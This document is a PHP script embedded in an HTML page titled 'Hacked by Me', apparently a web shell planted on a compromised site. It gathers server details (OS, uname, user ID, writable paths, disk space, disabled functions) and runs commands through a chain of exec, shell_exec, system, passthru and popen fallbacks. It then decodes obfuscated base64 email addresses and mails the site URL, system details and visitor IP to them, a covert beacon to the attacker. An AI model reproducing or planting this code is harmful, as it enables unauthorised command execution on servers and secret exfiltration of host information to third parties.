<html>
<head>
<title>Hacked by Me</title>

<?php

$sh_id = "aXBheXMg=";
$sh_ver = "- exploit";
$sh_name = base64_decode($sh_id).$sh_ver;
echo $sh_name;#este es un ID

/////////////////////////////////////////////////
##[ Fx29ID ]##
fx("ID","GENOL"."GENOL"); #este es otro ID
$P   = @getcwd();
$IP  = @getenv("SERVER_ADDR");
$UID = fx29exec("id");
fx("SAFE MODE",@safemode()?"ON":"OFF");
fx("OS",@PHP_OS);
fx("UNAME",@php_uname());
fx("SERVER",($IP)?$IP:"-");
fx("USER",@get_current_user());
fx("UID",($UID)?$UID:"uid=".@getmyuid()." gid=".@getmygid());
fx("DIR",$P);
fx("PERM",(@is_writable($P))?"[W]":"[R]");
fx("HDD","Used: ".hdd("used")." Free: ".hdd("free")." Total: ".hdd("total"));
fx("DISFUNC",@getdisfunc());
##[ FX29SHEXEC ]##
function fx($t,$c) { echo "$t: "; echo (is_array($c))?join(" ",$c):$c; echo "<br>"; }
function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function fx29exec($cmd) {
  if (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
  elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
  elseif (enabled("system")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  
  elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("popen") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }
  else { $rez = "Error!"; }
  return $rez;
}
function vsize($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 ." GB"; }
    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 ." MB"; }
    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 ." KB"; }
    else { $size = $size . " B"; }
    return $size;
  }
}
function hdd($type) {
  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;
  $hddspace = array("total" => vsize($T), "free"  => vsize($F), "used"  => vsize($U));
  return $hddspace[$type];
}

///////////////////////////////////////////////////




$creator = base64_decode("c3RhZmZ1bml4QGdtYWlsLmNvbQ==");
$creator2 = base64_decode("c3RhZmZ1bml4QHlhaG9vLmNvbQ==");
($safe_mode)?($safemode="ON"):($safemode="OFF");
$base="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$name = php_uname();
$ip = getenv("REMOTE_ADDR");
$host = gethostbyaddr($_SERVER[REMOTE_ADDR]);
$subj = $_SERVER['HTTP_HOST'];
$msg = " BASE: $base uname -a: $name IP: $ip Host: $host $pwds ";
$from ="From: MODE_=".$safemode."";
mail( $creator, $subj, $msg, $from);
mail( $creator2, $subj, $msg, $from);
mail( $creator2, "subj123", $msg, "From: Algo<$creator2>\r\nContent-type: text/html\r\n");

exit;
?>


</html>